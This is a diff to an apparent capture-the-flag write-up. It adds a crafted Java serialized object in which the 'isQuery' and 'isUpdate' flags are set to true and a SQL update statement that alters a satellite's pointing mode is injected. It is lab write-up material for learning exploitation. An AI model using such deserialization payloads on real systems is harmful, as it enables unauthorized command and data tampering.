@@ -78,7 +78,60 @@ Contents
 So this is a serialization of an object of class  "SatelliteQueryFileFolderUtility" - where we have a source code in column 3.
 We can see, that "isQuery" and "isUpdate" are both "false" and "pathOrStatement" contains "/opt/SatelliteQueryFileFolderUtility.java".
 
-Following the source code, the thw booleans
+Following the source code, the two booleans can be set to "true" and the string to "update pointing_mode set numerical_mode=1" on order to modify the pointing mode:
+```
+STREAM_MAGIC - 0xac ed
+STREAM_VERSION - 0x00 05
+Contents
+  TC_OBJECT - 0x73
+    TC_CLASSDESC - 0x72
+      className
+        Length - 31 - 0x00 1f
+        Value - SatelliteQueryFileFolderUtility - 0x536174656c6c697465517565727946696c65466f6c6465725574696c697479
+      serialVersionUID - 0x12 d4 f6 8d 0e b3 92 cb
+      newHandle 0x00 7e 00 00
+      classDescFlags - 0x02 - SC_SERIALIZABLE
+      fieldCount - 3 - 0x00 03
+      Fields
+        0:
+          Boolean - Z - 0x5a
+          fieldName
+            Length - 7 - 0x00 07
+            Value - isQuery - 0x69735175657279
+        1:
+          Boolean - Z - 0x5a
+          fieldName
+            Length - 8 - 0x00 08
+            Value - isUpdate - 0x6973557064617465
+        2:
+          Object - L - 0x4c
+          fieldName
+            Length - 15 - 0x00 0f
+            Value - pathOrStatement - 0x706174684f7253746174656d656e74
+          className1
+            TC_STRING - 0x74
+              newHandle 0x00 7e 00 01
+              Length - 18 - 0x00 12
+              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
+      classAnnotations
+        TC_ENDBLOCKDATA - 0x78
+      superClassDesc
+        TC_NULL - 0x70
+    newHandle 0x00 7e 00 02
+    classdata
+      SatelliteQueryFileFolderUtility
+        values
+          isQuery
+            (boolean)true - 0x01
+          isUpdate
+            (boolean)true - 0x01
+          pathOrStatement
+            (object)
+              TC_STRING - 0x74
+                newHandle 0x00 7e 00 03
+                Length - 41 - 0x00 29
+                Value - update pointing_mode set numerical_mode=1 - 0x75706461746520706f696e74696e675f6d6f646520736574206e756d65726963616c5f6d6f64653d31
+```
 
 
 **Achievement: Ipsum**
@@ -234,6 +287,6 @@ public class SatelliteQueryFileFolderUtility implements Serializable {
 
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwNzY5ODkyMTIsLTQ2NjI0MjMyMSwtMj
-AxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbMjExOTQ3NTM4MCwtNDY2MjQyMzIxLC0yMD
+EwMTkyNjNdfQ==
 -->
